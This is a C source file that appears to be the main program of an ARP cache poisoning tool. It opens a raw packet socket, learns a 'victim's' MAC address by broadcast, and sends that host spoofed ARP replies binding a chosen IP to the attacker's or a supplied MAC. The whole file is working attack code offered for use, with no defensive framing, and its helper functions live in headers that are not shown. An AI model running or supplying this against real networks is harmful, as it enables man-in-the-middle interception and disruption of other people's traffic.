#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include "arp_poisoning.h"
#include "network.h"
#include "error_messages.h"


static int hex2num(char c) {
         if (c >= '0' && c <= '9')
                 return c - '0';
         if (c >= 'a' && c <= 'f')
                 return c - 'a' + 10;
         if (c >= 'A' && c <= 'F')
                 return c - 'A' + 10;
         return -1;
 }

int hwaddr_aton(const char *txt, uint8_t *addr) {
         int i;

         for (i = 0; i < 6; i++) {
                 int a, b;

                 a = hex2num(*txt++);
                 if (a < 0)
                         return -1;
                 b = hex2num(*txt++);
                 if (b < 0)
                         return -1;
                 *addr++ = (a << 4) | b;
                 if (i < 5 && *txt++ != ':')
                         return -1;
         }

         return 0;
 }

void MACstrtoByte(const char* macStr,unsigned char* mac){

sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}


int			main(int argc, char *argv[])
{
  char			*victim_ip, *spoofed_ip_source, *interface,*mac_poison;
  uint8_t		*my_mac_address, *victim_mac_address;
  struct sockaddr_ll	device;
  int			sd;

  if (argc != 4 && argc != 5)
    return (usage(argv[0]), EXIT_FAILURE);
  if(argc==5){
	  spoofed_ip_source = argv[1]; victim_ip = argv[2]; interface = argv[3],mac_poison=argv[4];
	  if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
	    return (fprintf(stderr, ERROR_SOCKET_CREATION), EXIT_FAILURE);
	  my_mac_address=malloc(6*sizeof(uint8_t));
	  //if(hwaddr_aton(mac_poison,my_mac_address))
	//	return (fprintf(stderr, ERROR_GET_MAC), EXIT_FAILURE);
	  MACstrtoByte(mac_poison,my_mac_address);		
	  memset(&device, 0, sizeof device);
	  return (!(get_index_from_interface(&device, interface)
		    && send_packet_to_broadcast(sd, &device, my_mac_address, spoofed_ip_source, victim_ip)
		    && (victim_mac_address = get_victim_response(sd, victim_ip))
		    && send_payload_to_victim(sd, &device,
					      my_mac_address, spoofed_ip_source,
					      victim_mac_address, victim_ip))
		  ? (EXIT_FAILURE)
		  : (EXIT_SUCCESS));

	}
  else {
  	spoofed_ip_source = argv[1]; victim_ip = argv[2]; interface = argv[3];
	  if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
	    return (fprintf(stderr, ERROR_SOCKET_CREATION), EXIT_FAILURE);
	  if(!(my_mac_address = get_my_mac_address(sd, interface)))
	    return (fprintf(stderr, ERROR_GET_MAC), EXIT_FAILURE);
	  memset(&device, 0, sizeof device);
	  return (!(get_index_from_interface(&device, interface)
		    && send_packet_to_broadcast(sd, &device, my_mac_address, spoofed_ip_source, victim_ip)
		    && (victim_mac_address = get_victim_response(sd, victim_ip))
		    && send_payload_to_victim(sd, &device,
					      my_mac_address, spoofed_ip_source,
					      victim_mac_address, victim_ip))
		  ? (EXIT_FAILURE)
		  : (EXIT_SUCCESS));

  }
}
